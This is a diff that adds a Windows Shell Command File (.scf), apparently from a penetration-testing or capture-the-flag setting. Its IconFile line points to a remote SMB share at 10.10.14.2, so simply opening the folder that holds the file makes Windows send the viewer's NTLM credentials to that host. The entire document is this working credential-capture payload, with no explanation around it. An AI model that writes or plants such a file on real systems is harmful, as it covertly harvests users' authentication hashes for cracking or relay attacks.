@@ -1,0 +1,5 @@
+[Shell]
+Command=2
+IconFile=\\10.10.14.2\ninjafolder\blah.ico
+[Taskbar]
+Command=ToggleDesktop
